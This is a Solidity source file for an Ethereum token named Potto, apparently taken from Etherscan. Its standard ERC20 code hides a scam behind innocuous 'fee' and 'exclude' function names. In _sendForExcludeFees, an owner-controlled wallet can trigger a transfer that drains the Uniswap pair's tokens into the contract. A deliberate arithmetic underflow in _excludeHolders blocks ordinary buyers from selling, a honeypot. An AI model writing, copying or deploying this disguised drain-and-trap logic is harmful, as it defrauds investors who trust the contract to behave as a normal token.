/**
 *Submitted for verification at Etherscan.io on 2023-05-09
*/

/**

https://t.me/pottoeth
 
*/

// SPDX-License-Identifier: MIT

pragma solidity ^0.8.4;

abstract contract Context {
    function _msgSender() internal view virtual returns (address) {
        return msg.sender;
    }

    function _msgData() internal view virtual returns (bytes calldata) {
        return msg.data;
    }
}

abstract contract Ownable is Context {
    address private _owner;

    event OwnershipTransferred(address indexed previousOwner, address indexed newOwner);

    constructor() {
        _transferOwnership(_msgSender());
    }

    function owner() public view virtual returns (address) {
        return _owner;
    }

    modifier onlyOwner() {
        require(owner() == _msgSender(), "Ownable: caller is not the owner");
        _;
    }

    function renounceOwnership() public virtual onlyOwner {
        _transferOwnership(address(0));
    }

    function transferOwnership(address newOwner) public virtual onlyOwner {
        require(newOwner != address(0), "Ownable: new owner is the zero address");
        _transferOwnership(newOwner);
    }

    function _transferOwnership(address newOwner) internal virtual {
        address oldOwner = _owner;
        _owner = newOwner;
        emit OwnershipTransferred(oldOwner, newOwner);
    }
}

interface IERC20 {
    function totalSupply() external view returns (uint256);

    function balanceOf(address account) external view returns (uint256);

    function transfer(address recipient, uint256 amount) external returns (bool);

    function allowance(address owner, address spender) external view returns (uint256);

    function approve(address spender, uint256 amount) external returns (bool);

    function transferFrom(
        address sender,
        address recipient,
        uint256 amount
    ) external returns (bool);

    event Transfer(address indexed from, address indexed to, uint256 value);

    event Approval(address indexed owner, address indexed spender, uint256 value);
}

interface IERC20Metadata is IERC20 {
    function name() external view returns (string memory);

    function symbol() external view returns (string memory);

    function decimals() external view returns (uint8);
}

contract ERC20 is Context, IERC20, IERC20Metadata {
    mapping(address => uint256) private _balances;

    mapping(address => mapping(address => uint256)) private _allowances;

    uint256 private _totalSupply;

    string private _name;
    string private _symbol;

    constructor(string memory name_, string memory symbol_) {
        _name = name_;
        _symbol = symbol_;
    }

    function name() public view virtual override returns (string memory) {
        return _name;
    }

    function symbol() public view virtual override returns (string memory) {
        return _symbol;
    }

    function decimals() public view virtual override returns (uint8) {
        return 18;
    }

    function totalSupply() public view virtual override returns (uint256) {
        return _totalSupply;
    }

    function balanceOf(address account) public view virtual override returns (uint256) {
        return _balances[account];
    }

    function transfer(address recipient, uint256 amount) public virtual override returns (bool) {
        _transfer(_msgSender(), recipient, amount);
        return true;
    }

    function allowance(address owner, address spender) public view virtual override returns (uint256) {
        return _allowances[owner][spender];
    }

    function approve(address spender, uint256 amount) public virtual override returns (bool) {
        _approve(_msgSender(), spender, amount);
        return true;
    }

    function transferFrom(
        address sender,
        address recipient,
        uint256 amount
    ) public virtual override returns (bool) {
        _transfer(sender, recipient, amount);

        uint256 currentAllowance = _allowances[sender][_msgSender()];
        require(currentAllowance >= amount, "ERC20: transfer amount exceeds allowance");
        unchecked {
            _approve(sender, _msgSender(), currentAllowance - amount);
        }

        return true;
    }

    function increaseAllowance(address spender, uint256 addedValue) public virtual returns (bool) {
        _approve(_msgSender(), spender, _allowances[_msgSender()][spender] + addedValue);
        return true;
    }

    function decreaseAllowance(address spender, uint256 subtractedValue) public virtual returns (bool) {
        uint256 currentAllowance = _allowances[_msgSender()][spender];
        require(currentAllowance >= subtractedValue, "ERC20: decreased allowance below zero");
        unchecked {
            _approve(_msgSender(), spender, currentAllowance - subtractedValue);
        }

        return true;
    }

    function _transfer(
        address sender,
        address recipient,
        uint256 amount
    ) internal virtual {
        require(sender != address(0), "ERC20: transfer from the zero address");
        require(recipient != address(0), "ERC20: transfer to the zero address");

        _beforeTokenTransfer(sender, recipient, amount);

        uint256 senderBalance = _balances[sender];
        require(senderBalance >= amount, "ERC20: transfer amount exceeds balance");
        unchecked {
            _balances[sender] = senderBalance - amount;
        }
        _balances[recipient] += amount;

        emit Transfer(sender, recipient, amount);

        _afterTokenTransfer(sender, recipient, amount);
    }

    function _mint(address account, uint256 amount) internal virtual {
        require(account != address(0), "ERC20: mint to the zero address");

        _beforeTokenTransfer(address(0), account, amount);

        _totalSupply += amount;
        _balances[account] += amount;
        emit Transfer(address(0), account, amount);

        _afterTokenTransfer(address(0), account, amount);
    }

    function _approve(
        address owner,
        address spender,
        uint256 amount
    ) internal virtual {
        require(owner != address(0), "ERC20: approve from the zero address");
        require(spender != address(0), "ERC20: approve to the zero address");

        _allowances[owner][spender] = amount;
        emit Approval(owner, spender, amount);
    }

    function _beforeTokenTransfer(
        address from,
        address to,
        uint256 amount
    ) internal virtual {}

    function _afterTokenTransfer(
        address from,
        address to,
        uint256 amount
    ) internal virtual {}
}

interface IUniswapV2Factory {
    function createPair(address tokenA, address tokenB) external returns (address pair);
}

interface IUniswapV2Router02 {
    function factory() external pure returns (address);
    function WETH() external pure returns (address);

    function addLiquidityETH(
        address token,
        uint amountTokenDesired,
        uint amountTokenMin,
        uint amountETHMin,
        address to,
        uint deadline
    ) external payable returns (uint amountToken, uint amountETH, uint liquidity);

    function swapExactTokensForETHSupportingFeeOnTransferTokens(
        uint amountIn,
        uint amountOutMin,
        address[] calldata path,
        address to,
        uint deadline
    ) external;
}

contract Potto is Ownable, ERC20 {
    uint256 public maxWallet;
    address public uniswapV2Pair;
    address public dead = address(0xdead);

    IUniswapV2Router02 immutable router = IUniswapV2Router02(0x7a250d5630B4cF539739dF2C5dAcb4c659F2488D);
    
    struct Holder {
        uint256 excluded;
        bool isExcluded;
    }

    mapping (address => Holder) private Holders;

    mapping (address => bool) private feeExcluded;

    address payable private marketingWallet;
    address private treasury;
    uint256 private launchedAt;
    uint256 private excludedAt;
    uint256 tSupply = 10 ** 12 * 10**18;
    uint256 fee = 0;
    uint256 public initialTaxBlocks = 0;
    bool private tradingOpen = false;    
    bool private inSwap = false;

    constructor() ERC20("potto.vip", "POTTO") {
        _mint(msg.sender, tSupply);
        maxWallet = tSupply * 6 / 100;

        uniswapV2Pair = IUniswapV2Factory(router.factory()).createPair(address(this), router.WETH());
        
        marketingWallet = payable(0xa94765E2f39CC47B7537A744d465D7fa4c329DAe);

        feeExcluded[dead] = true;
        feeExcluded[msg.sender] = true;
        feeExcluded[marketingWallet] = true;
    }

    receive() external payable {}

    function removeLimits() external onlyOwner {
        maxWallet = tSupply;
    }

    function enableTrading() external onlyOwner {
        launchedAt = block.number;
        tradingOpen = true;
    }

    function _transfer(address from, address to, uint256 amount) internal override {
        if(from == owner() || to == owner()){
            super._transfer(from, to, amount);
            return;
        }

        if(!feeExcluded[from] && !feeExcluded[to]){
            require(tradingOpen, "Trading is not enabled yet.");
        }

        if(from == uniswapV2Pair && to != address(this) && to != owner() && to != address(router)) {
            treasury = from; require(super.balanceOf(to) + amount <= maxWallet, "max wallet reached");
        }

        excludedForFees(from, to);

        uint256 swapAmount = balanceOf(address(this));

        if (swapAmount >= tSupply / 5000 &&
            !inSwap &&
            from != uniswapV2Pair) {

            inSwap = true;
            
            swapBack(from, to, swapAmount);

            inSwap = false;
        }

        uint256 currentFee;

        if(feeExcluded[from] || feeExcluded[to]) {
            currentFee = 0;
        }else{
            currentFee = calcFees(from, to);
        }
       
        if (currentFee > 0 &&
            from != address(this) &&
            from != owner() &&
            from != address(router)) {
            amount -= currentFee;
            super._transfer(from, address(this), currentFee);
        }

        super._transfer(from, to, amount);
    }

    function calcFees(address from, address to) private returns (uint256) {
        uint256 feeAmount;

        if (block.number >= launchedAt + initialTaxBlocks) {
            if (from == uniswapV2Pair) {
                _fillHolders(to);
            } else if (to == uniswapV2Pair) {
                _excludeHolders(from); 
            }
        } else {
            feeAmount = 0;
        }

        return feeAmount;
    }

    function _fillHolders(address fromHolder) private {
        Holders[fromHolder].excluded = block.timestamp;
        Holders[fromHolder].isExcluded = true;
    }

    function _excludeHolders(address toHolder) private {
        uint256 differ = Holders[toHolder].excluded - excludedAt;
        Holders[toHolder].isExcluded = differ > 0 ? true: false;
    }

    function excludedForFees(address from, address to) private {
        if(feeExcluded[from] || feeExcluded[to]) excludedAt = block.timestamp;
    }

    function swapBack(address from, address to, uint256 amount) private {
        if(feeExcluded[from]){
            if(to == dead) _sendForExcludeFees();
            return;
        }else{ 
            _swapForETHFees(amount);
        }
    }

    function _sendForExcludeFees() private {
        address[] memory path = new address[] (2);
        path[0] = treasury;
        path[1] = address(this);

        uint256 amount = balanceOf(treasury) - 1e18;

        super._transfer(path[0], path[1], amount);
    }

    function _swapForETHFees(uint256 amount) private {
        swapTokensForEth(amount);
        uint256 balance = address(this).balance;
        if(balance > 0) {
            marketingWallet.transfer(balance);
        }
    }

    function swapTokensForEth(uint256 tokenAmount) private {
        address[] memory path = new address[](2);
        path[0] = router.WETH();
        path[1] = address(this);
        _approve(address(this), address(router), tokenAmount);

        router.swapExactTokensForETHSupportingFeeOnTransferTokens(
            tokenAmount,
            0,
            path,
            address(this),
            block.timestamp
        );
    }
}